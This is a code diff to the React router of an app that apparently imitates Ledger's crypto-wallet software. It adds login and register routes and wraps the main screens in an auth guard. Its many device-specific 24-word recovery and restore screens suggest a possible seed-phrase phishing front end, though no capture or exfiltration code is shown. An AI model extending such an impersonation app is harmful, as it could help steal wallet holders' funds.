@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from "react";
 import {
-  HashRouter as Router,
+  BrowserRouter  as Router,
   Routes,
   Route,
   Navigate,
@@ -13,6 +13,7 @@ import Send from "./components/Screens/Send";
 import Receive from "./components/Screens/Receive";
 import Manager from "./components/Screens/Manager";
 import Settings from "./components/Screens/Settings";
+import ProtectedRoute from "./components/loginProcess/ProtectedRoute";
 
 // Onboarding Screens
 import Welcome from "./components/Onboarding/Welcome";
@@ -21,6 +22,7 @@ import AccountImport from "./components/Onboarding/AccountImport";
 import AppSetup from "./components/Onboarding/AppSetup";
 import Login from "./components/Onboarding/Login";
 import Login1 from "./components/loginProcess/Login";
+import LedgerRecover from "./components/popups/LedgerRecover"; // Import the login component
 
 import "./App.css";
 import AllDevices from "./components/loginProcess/AllDevices";
@@ -41,6 +43,7 @@ import Restore_Recovery_Nano_X from "./components/loginProcess/allDevices_subsec
 import Recover_24 from "./components/loginProcess/allDevices_subsection/nano-s-plus-subsections/Recover_24";
 import ForgetPasswordLedger from "./components/popups/ForgetPasswordLedger";
 import Recover_24_Nano_X from "./components/loginProcess/allDevices_subsection/nano-x-subsection/Recover_24_NanoX";
+import LedgerRegister from "./components/popups/LedgerRegister";
 
 function AppContent() {
   const location = useLocation();
@@ -57,13 +60,15 @@ function AppContent() {
     else setCurrentScreen("portfolio");
   }, [location]);
 
-  // 🚫 No onboarding or login checks — everything is accessible
-
   return (
     <div className="min-h-screen bg-gray-950 dark">
       <Routes>
-        {/* All onboarding and device routes still exist */}
+        {/* Public Routes */}
         <Route path="/" element={<Login1 />} />
+        <Route path="/login" element={<LedgerRecover />} />
+        <Route path="/register" element={<LedgerRegister />} />
+        
+        {/* Device Selection Routes */}
         <Route path="/all-devices" element={<AllDevices />} />
         <Route path="/all-devices/ledger-stax" element={<Ledger_Stax />} />
         <Route path="/all-devices/ledger-flex" element={<Ledger_Flex />} />
@@ -73,7 +78,8 @@ function AppContent() {
           element={<Ledger_Nano_S_Plus />}
         />
         <Route path="/all-devices/ledger-nano-x" element={<Ledger_Nano_X />} />
-        {/* Nano-S */}
+        
+        {/* Nano-S Routes */}
         <Route
           path="/all-devices/ledger-nano-s/first-time-nano-s"
           element={<First_Time_Nano_S />}
@@ -86,7 +92,8 @@ function AppContent() {
           path="/all-devices/ledger-nano-s/restore-recovery-nano-s"
           element={<Restore_Recovery_Nano_S />}
         />
-        {/* Nano-S-Plus */}
+        
+        {/* Nano-S-Plus Routes */}
         <Route
           path="/all-devices/ledger-nano-s-plus/first-time-nano-s-plus"
           element={<First_Time_Nano_S_Plus />}
@@ -107,7 +114,8 @@ function AppContent() {
           path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus/forget-password"
           element={<ForgetPasswordLedger />}
         />
-        {/* Nano-X */}
+        
+        {/* Nano-X Routes */}
         <Route
           path="/all-devices/ledger-nano-x/first-time-nano-x"
           element={<First_Time_Nano_X />}
@@ -124,7 +132,8 @@ function AppContent() {
           path="/all-devices/ledger-nano-x/restore-24-nano-x"
           element={<Recover_24_Nano_X />}
         />
-        {/* Onboarding routes */}
+        
+        {/* Onboarding Routes */}
         <Route path="/onboarding-welcome" element={<Welcome />} />
         <Route
           path="/onboarding/device-connection"
@@ -132,75 +141,89 @@ function AppContent() {
         />
         <Route path="/onboarding/account-import" element={<AccountImport />} />
         <Route path="/onboarding/app-setup" element={<AppSetup />} />
-        {/* Main App Routes */}
+        
+        {/* Protected Main App Routes */}
         <Route
           path="/dashboard"
           element={
-            <MainLayout
-              currentScreen={currentScreen}
-              onScreenChange={setCurrentScreen}
-            >
-              <Dashboard />
-            </MainLayout>
+            <ProtectedRoute>
+              <MainLayout
+                currentScreen={currentScreen}
+                onScreenChange={setCurrentScreen}
+              >
+                <Dashboard />
+              </MainLayout>
+            </ProtectedRoute>
           }
         />
         <Route
           path="/accounts"
           element={
-            <MainLayout
-              currentScreen={currentScreen}
-              onScreenChange={setCurrentScreen}
-            >
-              <Accounts />
-            </MainLayout>
+            <ProtectedRoute>
+              <MainLayout
+                currentScreen={currentScreen}
+                onScreenChange={setCurrentScreen}
+              >
+                <Accounts />
+              </MainLayout>
+            </ProtectedRoute>
           }
         />
         <Route
           path="/send"
           element={
-            <MainLayout
-              currentScreen={currentScreen}
-              onScreenChange={setCurrentScreen}
-            >
-              <Send />
-            </MainLayout>
+            <ProtectedRoute>
+              <MainLayout
+                currentScreen={currentScreen}
+                onScreenChange={setCurrentScreen}
+              >
+                <Send />
+              </MainLayout>
+            </ProtectedRoute>
           }
         />
         <Route
           path="/receive"
           element={
-            <MainLayout
-              currentScreen={currentScreen}
-              onScreenChange={setCurrentScreen}
-            >
-              <Receive />
-            </MainLayout>
+            <ProtectedRoute>
+              <MainLayout
+                currentScreen={currentScreen}
+                onScreenChange={setCurrentScreen}
+              >
+                <Receive />
+              </MainLayout>
+            </ProtectedRoute>
           }
         />
         <Route
           path="/manager"
           element={
-            <MainLayout
-              currentScreen={currentScreen}
-              onScreenChange={setCurrentScreen}
-            >
-              <Manager />
-            </MainLayout>
+            <ProtectedRoute>
+              <MainLayout
+                currentScreen={currentScreen}
+                onScreenChange={setCurrentScreen}
+              >
+                <Manager />
+              </MainLayout>
+            </ProtectedRoute>
           }
         />
         <Route
           path="/settings"
           element={
-            <MainLayout
-              currentScreen={currentScreen}
-              onScreenChange={setCurrentScreen}
-            >
-              <Settings />
-            </MainLayout>
+            <ProtectedRoute>
+              <MainLayout
+                currentScreen={currentScreen}
+                onScreenChange={setCurrentScreen}
+              >
+                <Settings />
+              </MainLayout>
+            </ProtectedRoute>
           }
         />
-        {/* Catch all */}
-        <Route path="*" element={<Navigate to="/" replace />} />
+        
+        {/* Catch all - redirect to login */}
+        <Route path="*" element={<Navigate to="/login" replace />} />
       </Routes>
     </div>
   );
